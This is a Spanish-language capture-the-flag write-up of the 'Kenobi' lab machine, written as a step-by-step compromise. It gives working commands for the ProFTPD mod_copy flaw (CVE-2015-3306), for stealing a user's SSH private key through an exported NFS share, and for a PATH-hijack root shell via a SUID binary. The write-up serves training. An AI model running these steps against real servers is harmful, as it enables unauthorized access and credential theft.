# Kenobi

Conceptos clave: SMB Enumeration, ProFTPD Vulnerability (mod_copy), NFS Share Mounting, SSH Key Theft, SUID Privilege Escalation, PATH Variable Hijacking
Dificultad: Fácil
Fecha: 21 de junio de 2026

## Resumen
Compromiso total de la máquina **Kenobi** (Linux) mediante el encadenamiento de múltiples vulnerabilidades en servicios mal configurados. La auditoría comenzó con el descubrimiento de un archivo de registro (log) expuesto vía SMB, revelando la ubicación de la clave privada SSH del usuario. Aprovechando la vulnerabilidad `mod_copy` en ProFTPD (CVE-2015-3306), se copió dicha clave a un directorio exportado por NFS. Tras montar el directorio remotamente y obtener la clave, se logró acceso inicial por SSH. Finalmente, se escaló a `root` explotando un binario SUID vulnerable a la manipulación de la variable de entorno `$PATH`.

---

## 1. Reconocimiento (Recon)

### 1.1 Escaneo de Red
Se comprobó la conectividad y se realizó un escaneo completo de puertos para identificar la superficie de ataque:

```bash
nmap -p- --open -T4 -v -n <IP>
```

Se identificaron 7 puertos abiertos. Posteriormente, se lanzaron scripts de enumeración y detección de versiones sobre los mismos:

```bash
nmap -p 21,22,80,111,139,445,2049 -sC -sV <IP>
```

**Servicios descubiertos:**
* `21/tcp`: FTP (ProFTPD 1.3.5)
* `22/tcp`: SSH
* `80/tcp`: HTTP
* `111/tcp`, `2049/tcp`: RPC / NFS (Network File System)
* `139/tcp`, `445/tcp`: SMB / Samba

### 1.2 Enumeración por Servicios
*   **FTP (21):** Se intentó acceso anónimo mediante `nc <IP> 21`. El comando `OPTIONS` reveló la necesidad de autenticación explícita (`USER` / `PASS`), bloqueando el acceso anónimo directo.
*   **HTTP (80):** *Fuzzing* de directorios con `gobuster`. Solo se localizó un `robots.txt` vacío.
*   **SMB (139/445):** Se listaron los recursos compartidos con sesión nula:
```bash
    smbclient -L //<IP> -N
```

Se identificó la montura `Anonymous`. Accediendo a ella sin contraseña, se descargó el archivo `log.txt`.
*   **Análisis de `log.txt`:** El archivo contenía registros de generación de claves SSH, revelando la ubicación estática `/home/kenobi/.ssh/id_rsa`. Además, expuso la configuración de ProFTPD, confirmando su versión (1.3.5).

### 1.3 Enumeración de NFS
Sabiendo que NFS estaba activo, se verificaron las monturas exportadas por el servidor:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```
**Hallazgo:** El directorio `/var` estaba exportado y accesible de forma remota.

---

## 2. Acceso Inicial (Initial Access)

### 2.1 Explotación de ProFTPD (mod_copy)
La versión de ProFTPD 1.3.5 es vulnerable al uso no autenticado de los comandos `SITE CPFR` (Copy From) y `SITE CPTO` (Copy To), lo que permite copiar archivos en el sistema local del servidor.

Conectando vía `netcat` al puerto 21, se explotó esta vulnerabilidad para mover la clave SSH descubierta en la fase anterior hacia el directorio `/var/tmp` (el cual forma parte de la montura NFS exportada):

```text
nc <IP> 21
220 ProFTPD 1.3.5 Server
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### 2.2 Montaje de NFS y Obtención de Credenciales
Desde la máquina atacante, se montó el directorio exportado para recuperar la clave SSH:

```bash
mkdir /mnt/kenobiNFS
sudo mount <IP>:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo umount /mnt/kenobiNFS
```

### 2.3 Acceso SSH
Con la clave privada en posesión, se le asignaron los permisos correctos y se inició sesión, obteniendo la primera bandera (`user.txt`).

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@<IP>
```

---

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de Binarios SUID
Dentro de la máquina, se buscaron binarios con el bit SUID activado (ejecución con privilegios del propietario, en este caso, `root`):

```bash
find / -perm -u=s -type f 2>/dev/null
```
Destacó un archivo inusual: `/usr/bin/menu`.

### 3.2 Ingeniería Inversa Básica
Al ejecutar el binario interactivo, presentaba un menú con 3 opciones que devolvían comandos de red y sistema. Utilizando el comando `strings` sobre el binario, se analizó su comportamiento interno:

```bash
strings /usr/bin/menu
```
Se identificó que el programa invocaba comandos del sistema (`curl`, `uname`, `ifconfig`) utilizando **rutas relativas** en lugar de rutas absolutas (ej. llamaba a `curl` en vez de `/usr/bin/curl`).

### 3.3 Explotación (PATH Variable Hijacking)
Al usar rutas relativas, el sistema operativo busca el ejecutable leyendo la variable de entorno `$PATH` de izquierda a derecha. Se procedió a secuestrar esta variable:

1. Se creó un ejecutable falso llamado `curl` que en realidad lanzaba una *shell* (`/bin/sh`).
2. Se le dieron permisos de ejecución.
3. Se añadió el directorio actual (`/tmp`) al inicio de la variable `$PATH`.

```bash
cd /tmp
echo /bin/sh > curl
chmod +x curl
export PATH=$(pwd):$PATH
```

### 3.4 Compromiso Total
Al ejecutar nuevamente el binario SUID `/usr/bin/menu` y seleccionar la opción que invoca `curl`, el sistema ejecutó el binario malicioso ubicado en `/tmp`. Dado que `/usr/bin/menu` tenía permisos SUID, la *shell* generada heredó los privilegios del propietario.

**Resultado:** Se obtuvo una *shell* interactiva como `root`, completando el compromiso de la máquina y accediendo a la bandera final.
